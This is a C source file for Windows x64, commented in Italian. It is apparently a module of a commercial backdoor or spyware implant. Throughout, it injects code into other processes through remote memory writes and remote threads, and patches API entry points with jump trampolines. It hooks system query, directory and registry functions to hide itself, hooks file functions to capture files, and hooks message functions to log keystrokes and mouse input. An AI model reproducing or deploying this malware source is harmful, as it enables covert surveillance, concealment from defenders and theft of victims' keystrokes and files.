#include <windows.h>
#include <Tlhelp32.h>

#include "Common.h"
#include "missing.h"
#include "Hooking.h"
#include "Hiding.h"
#include "DriverAccess.h"

// Per gli agenti
#include "Keylog_Mouse.h"
#include "FileCapture.h"
#include "Snapshots.h"

// viene valorizzato dalla funzione di inizializzazione delle variabili globali
void *IPC_SHM_Kernel_Object = NULL;

// Verifica se un API e' gia' hookata da noi
BOOL IsHooked(BYTE *code)
{
	if (code[0]==0x48 && code[1]==0xC7 && code[2]==0xC0 && code[7]==0xFF && code[8]==0xE0)
		return TRUE;

	return FALSE;
}

// Verifica se ha gia' gli handle aperti alla shared mem
#define STATUS_INFO_LENGTH_MISMATCH      ((NTSTATUS)0xC0000004L)
#define STATUS_SUCCESS 0
BOOL CheckIPCAlreadyExist(DWORD pid, void *kobj)
{
	static ZWQUERYSYSTEMINFORMATION ZwQuerySystemInformation = NULL;
	LONG Status;
	static DWORD *p = NULL;
	int i;
	DWORD n = 0x4000;
	HMODULE hNtdll;
	PSYSTEM_HANDLE_INFORMATION hinfo;
	BOOL now_created = FALSE;

	if (kobj == NULL)
		return TRUE;

	for (i=0; i<2; i++) {
		if (p == NULL) {
			if (ZwQuerySystemInformation == NULL) {
				hNtdll = GetModuleHandle("ntdll.dll");
				ZwQuerySystemInformation = (ZWQUERYSYSTEMINFORMATION)GetProcAddress(hNtdll, "ZwQuerySystemInformation");
				if (!ZwQuerySystemInformation)
					return TRUE;
			}

			if ( !(p = (DWORD *)malloc(n)) )
				return TRUE;

			while ( (Status=ZwQuerySystemInformation(SystemHandleInformation, p, n, 0)) == STATUS_INFO_LENGTH_MISMATCH ) {
				SAFE_FREE(p);
				n*=4;
				if (!(p = (DWORD *)malloc(n)))
					return TRUE;
			}
			if (Status != STATUS_SUCCESS) {
				SAFE_FREE(p);
				return TRUE;
			}
			now_created = TRUE;
		}

		hinfo = PSYSTEM_HANDLE_INFORMATION(p + 2);
		for (DWORD i = 0; i < *p; i++) {
			if (hinfo[i].ProcessId == pid  && hinfo[i].Object == kobj) {
				return TRUE;
			}
		}
		
		if(now_created)
			return FALSE;
		
		SAFE_FREE(p);
	}
	return FALSE;
}

// Marca un processo come hookato. Se torna FALSE vuol dire che ha fallito o che 
// il processo e' gia' hookato
#define PAGE_MARKER PAGE_EXECUTE_WRITECOPY
BOOL MarkProcess(DWORD pid)
{
	// E' sufficiente il secondo check che e' anche compatibile
	// con l'installazione multipla di backdoor - XXX MINST
	/*BYTE *header_ptr = NULL;
	HANDLE hmodules, hprocess;
	MODULEENTRY32W me32;
	MEMORY_BASIC_INFORMATION mbi;
	DWORD dummy;
	
	me32.dwSize = sizeof(MODULEENTRY32W); 
	hmodules = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid);
	if (hmodules == INVALID_HANDLE_VALUE)
		return FALSE;

	if(!Module32FirstW(hmodules, &me32)) {
		CloseHandle(hmodules);
		return FALSE;
	}

	do {
		if (!wcsicmp(me32.szModule, L"ntdll.dll")) {
			header_ptr = me32.modBaseAddr;
			break;
		}
	} while(Module32NextW(hmodules, &me32));
	CloseHandle(hmodules);
	if (header_ptr == NULL)
		return FALSE;
	
	hprocess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
	if (hprocess == NULL)
		return FALSE;

	if (!VirtualQueryEx(hprocess, header_ptr, &mbi, sizeof(mbi))) {
		CloseHandle(hprocess);
		return FALSE;
	} 
	CloseHandle(hprocess);

	// Ha trovato il marker di pagina
	if (mbi.Protect & PAGE_MARKER) 
		return FALSE;

	hprocess = OpenProcess(PROCESS_VM_OPERATION, FALSE, pid);
	if (hprocess == NULL)
		return FALSE;

	if (!VirtualProtectEx(hprocess, header_ptr, 32, PAGE_MARKER, &dummy)) {
		CloseHandle(hprocess);
		return FALSE;
	}

	CloseHandle(hprocess);*/

	// Check sugli handle della shared mem
	if (CheckIPCAlreadyExist(pid, IPC_SHM_Kernel_Object))
		return FALSE;

	return TRUE;
}

// Setup per il thread di hooking
BOOL HookingThreadSetup(void *pD)
{	
	HMODULE hMod;
	HookingThreadDataStruct *HookingThreadData = (HookingThreadDataStruct *) pD;

	VALIDPTR(hMod = GetModuleHandle("KERNEL32.DLL"))

	// API utilizzate dal thread remoto.... [KERNEL32.DLL]
	VALIDPTR(HookingThreadData->pLoadLibrary = (LoadLibrary_t) GetProcAddress(hMod, "LoadLibraryW"))
	VALIDPTR(HookingThreadData->pGetProcAddress = (GetProcAddress_t) GetProcAddress(hMod, "GetProcAddress"))
	VALIDPTR(HookingThreadData->pFreeLibrary = (FreeLibrary_t) GetProcAddress(hMod, "FreeLibrary"))
	
	if (!FindModulePath(HookingThreadData->dll_full_path, sizeof(HookingThreadData->dll_full_path)))
		return FALSE;

	strcpy(HookingThreadData->hook_func_name, EXPORTED_FUNC);

	return TRUE;
}
				
// Thread eseguito nel processo target per fare l'hooking
DWORD HookingThread(HookingThreadDataStruct *pDataThread)
{
	MakeHooking_t pMakeHooking = NULL; 
	HMODULE h_dll = NULL;
	
	if (! (h_dll = pDataThread->pLoadLibrary(pDataThread->dll_full_path)) )
		return 0;

	pMakeHooking = (MakeHooking_t) pDataThread->pGetProcAddress(h_dll, pDataThread->hook_func_name);
	if (pMakeHooking)
		pMakeHooking();

	pDataThread->pFreeLibrary(h_dll);

	return 1;
}

// Alloca codice e dati in un processo target
void *InjectCode(DWORD pid, BYTE *hook_add, DWORD hook_size, BYTE *data_add, DWORD data_size, BYTE **rha, BYTE **rda) 
{
	HANDLE h_process;
	SIZE_T dummy;
	DWORD call_offs;
	BYTE *search_ptr;
	BYTE *remote_hook_add;
	BYTE *remote_data_add;

	if (rha)
		*rha = NULL;
	if (rda)
		*rda = NULL;

	if((h_process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid)) == NULL)
		return NULL;

	remote_hook_add = (BYTE *)VirtualAllocEx(h_process, 0, hook_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
	remote_data_add = (BYTE *)VirtualAllocEx(h_process, 0, data_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE );

	if (!remote_hook_add || !remote_data_add) {
		CloseHandle(h_process);
		return NULL;
	}
		
	if (!WriteProcessMemory(h_process, remote_hook_add, hook_add, hook_size, &dummy) ||
		!WriteProcessMemory(h_process, remote_data_add, data_add, data_size, &dummy) ) {
		CloseHandle(h_process);
		return NULL;
	}

	CloseHandle(h_process);

	if (rha)
		*rha = remote_hook_add;
	if (rda)
		*rda = remote_data_add;

	return remote_hook_add;
}

// Lancia il thread di hooking nel processo target
BOOL StartHookingThread(DWORD pid)
{
	HANDLE h_thread, h_process;
	LPTHREAD_START_ROUTINE p_remote_func;
	void *p_remote_data;
	DWORD dummy;
	HookingThreadDataStruct HookingThreadData;

	// Hooka i processi una sola volta
	if (!MarkProcess(pid))
		return FALSE;	

	if(!HookingThreadSetup(&HookingThreadData))
		return FALSE;

	if (!InjectCode(pid, (BYTE *)HookingThread, 500, (BYTE *)&HookingThreadData, sizeof(HookingThreadData), (BYTE **)&p_remote_func, (BYTE **)&p_remote_data))
		return FALSE;

	// Esegue il thread di hooking
	if (! (h_process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid)) )
		return FALSE;

	h_thread = CreateRemoteThread(h_process, NULL, 8192, p_remote_func, p_remote_data, 0, &dummy);
	CloseHandle(h_process);
	if(!h_thread)
		return FALSE;		

	CloseHandle(h_thread);
	return TRUE;
}

// Hooka un API
BOOL HookDLLFunction(char *func_name, char *dll_name, BYTE *hook_add, DWORD hook_len, BYTE *data_add, DWORD data_len, DWORD arg_count)
{
	CommonDataStruct *common_data;
	HMODULE h_dll;
	HANDLE h_proc;
	DWORD call_offs;
	SIZE_T dummy;
	BYTE *hooked_func, *reentry_point, *trampoline;
	BYTE *local_hook_add = NULL;
	BYTE *local_data_add = NULL;
	DWORD rewritten_bytes;
	BYTE jmp_code[12] = { 0x48, 0xB8, 0, 0, 0, 0, 0, 0, 0, 0, 0xFF, 0xE0 };

	common_data = (CommonDataStruct *)data_add;
	// Se specifico una DLL e una funzione, le cerca
	// Altrimenti sara' gia' specificato bAPIAdd dal Setup 
	if (func_name && dll_name) {
		if ( !(h_dll = LoadLibraryA(dll_name)) )
			return FALSE;
		common_data->bAPIAdd = (BYTE *)GetProcAddress(h_dll, func_name);
		if (!common_data->bAPIAdd)
			return FALSE;
	}
	hooked_func = common_data->bAPIAdd;

	// Permette hooking multipli nel caso di backdoor di diversi clienti
	// il processo viene cmq hookato una volta sola dalla stessa backdoor - XXX 
	//if (IsHooked(hooked_func))
		//return FALSE;

	// Alloca codice e dati
	local_hook_add = (BYTE *)VirtualAlloc(NULL, hook_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	local_data_add = (BYTE *)VirtualAlloc(NULL, data_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!local_hook_add || !local_data_add) {
		SAFE_VFREE(local_hook_add);
		SAFE_VFREE(local_data_add);
		return FALSE;
	}

	// sceglie il giusto CALLSTUB a seconda del numero di parametri
	if (arg_count<4)
		memcpy(common_data->CallStub, CALLSTUB1, sizeof(common_data->CallStub));
	else
		memcpy(common_data->CallStub, CALLSTUB2, sizeof(common_data->CallStub));

	// Setta nel callstub i 3 parametri necessari (indirizzo hook, indirizzo ai dati, numero di parametri)
	for (call_offs=0; *(common_data->CallStub + call_offs) != 0x67 && call_offs<CODE_PATCH_LIMIT; call_offs++);
	if (call_offs<CODE_PATCH_LIMIT) // 0x67 -> Indirizzo della funzione hook
		memcpy(common_data->CallStub + call_offs, &local_hook_add, 8);
	for (call_offs=0; *(common_data->CallStub + call_offs) != 0x69 && call_offs<CODE_PATCH_LIMIT; call_offs++);
	if (call_offs<CODE_PATCH_LIMIT) // 0x69 -> Puntatore ai dati
		memcpy(common_data->CallStub + call_offs, &local_data_add, 8);
	if (arg_count>=4) {
		for (call_offs=0; *(common_data->CallStub + call_offs) != 0x66 && call_offs<CODE_PATCH_LIMIT; call_offs++);
		if (call_offs<CODE_PATCH_LIMIT) // 0x66 -> numero di parametri
			memcpy(common_data->CallStub + call_offs, &arg_count, 4);
	}

	// Calcolo quanti byte mi mangio della funzione per la JMP
	for (rewritten_bytes=0; rewritten_bytes<sizeof(jmp_code); rewritten_bytes+=GetInstructionLength_x64(hooked_func+rewritten_bytes, 64));

	// Creo lo stub per la chiamata originale e lo faccio puntare al reentry point
	memcpy(common_data->OriginalCode, ORIGINALCODE, sizeof(common_data->OriginalCode));
	reentry_point = hooked_func + rewritten_bytes;
	for (call_offs=0; *(common_data->OriginalCode + call_offs) != 0x68 && call_offs<CODE_PATCH_LIMIT; call_offs++);
	if (call_offs<CODE_PATCH_LIMIT) // 0x68 -> Indirizzo della funzione originale
		memcpy(common_data->OriginalCode + call_offs, &reentry_point, sizeof(reentry_point));
	// Copio i primi byte che verranno sovrascritti all'inizio del mio stub
	memcpy(common_data->OriginalCode, hooked_func, rewritten_bytes);

	// Copia il codice e i dati patchati
	memcpy(local_hook_add, hook_add, hook_len);
	memcpy(local_data_add, data_add, data_len);

	// Sostituisce i primi byte della funzione da hookare con una JMP
	trampoline = local_data_add + sizeof(common_data->OriginalCode); // Il call stub e' la seconda entry
	memcpy(jmp_code + 2, &trampoline, 8);

	h_proc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());
	if (h_proc) {
		WriteProcessMemory(h_proc, hooked_func, jmp_code, sizeof(jmp_code), &dummy);
		CloseHandle(h_proc);
		return TRUE;
	}

	return FALSE;
}

// Inizializza le funzioni IPC nel processo infettato
void SetupServices(BYTE *raw_data)
{
	IPCClientRead_data_struct read_data;
	IPCClientWrite_data_struct write_data;
	CommonDataStruct *common_setup = (CommonDataStruct *)raw_data;

	IPCClientRead_setup(&read_data);
	IPCClientWrite_setup(&write_data);

	// Se InjectCode fallisce, i puntatori a funzione e dati nel CommonData
	// saranno nulli (i wrapper non scorreranno)
	InjectCode(GetCurrentProcessId(), (BYTE *)IPCClientRead, 500, (BYTE *)&read_data, sizeof(read_data), (BYTE **)&(common_setup->ipc_client_read), (BYTE **)&(common_setup->ipc_read_data));
	InjectCode(GetCurrentProcessId(), (BYTE *)IPCClientWrite, 1000, (BYTE *)&write_data, sizeof(write_data), (BYTE **)&(common_setup->ipc_client_write), (BYTE **)&(common_setup->ipc_write_data));
}

BOOL IsInKernelBase()
{
	HMODULE hkernelbase;
	hkernelbase = GetModuleHandle("kernelbase.dll");
	if (hkernelbase == NULL)
		return FALSE;
	if (GetProcAddress(hkernelbase, "ReadDirectoryChangesW"))
		return TRUE;

	return FALSE;
}

// Funzione richiamata dal thread di hooking
void __stdcall H64_MakeHooking(void)
{
	BYTE CommonSetup[1024];

	SetupServices(CommonSetup);

	// Hiding
	MAKE_HOOK("NtQuerySystemInformation", "ntdll.dll", H_NtQuerySystemInformation, 4, CommonSetup); 
	MAKE_HOOK("NtQueryDirectoryFile", "ntdll.dll", H_NtQueryDirectoryFile, 11, CommonSetup); 
	MAKE_HOOK("NtEnumerateValueKey", "ntdll.dll", H_NtEnumerateValueKey, 6, CommonSetup); 
	MAKE_HOOK("NtQueryKey", "ntdll.dll", H_NtQueryKey, 5, CommonSetup); 

	// Se esiste quella in kernelbase deve hookarla, perche' quella in kernel32 e' solo un wrapper
	if (IsInKernelBase())
		MAKE_HOOK("ReadDirectoryChangesW", "kernelbase.dll", H_ReadDirectoryChangesW, 8, CommonSetup); 
	else
		MAKE_HOOK("ReadDirectoryChangesW", "kernel32.dll", H_ReadDirectoryChangesW, 8, CommonSetup); 

	// FileOpen e FileCapture
	MAKE_HOOK("CreateFileW", "kernelbase.dll", H_CreateFileW, 7, CommonSetup); 
	MAKE_HOOK("DeleteFileW", "kernelbase.dll", H_DeleteFileW, 1, CommonSetup); 
	MAKE_HOOK("MoveFileW", "kernel32.dll", H_MoveFileW, 2, CommonSetup); 

	// Keylog e Mouse
	MAKE_HOOK("PeekMessageA", "user32.dll", H_PeekMessage, 5, CommonSetup); 
	MAKE_HOOK("PeekMessageW", "user32.dll", H_PeekMessage, 5, CommonSetup); 
	MAKE_HOOK("GetMessageA", "user32.dll", H_GetMessage, 4, CommonSetup); 
	MAKE_HOOK("GetMessageW", "user32.dll", H_GetMessage, 4, CommonSetup); 
	//MAKE_HOOK("ImmGetCompositionStringW", "imm32.dll", H_ImmGetCompositionString, 4, CommonSetup); 

	// Snapshots
	//MAKE_HOOK("CreateWindowExA", "user32.dll", H_CreateWindowEx, 12, CommonSetup); 
	//MAKE_HOOK("CreateWindowExW", "user32.dll", H_CreateWindowEx, 12, CommonSetup); 
}

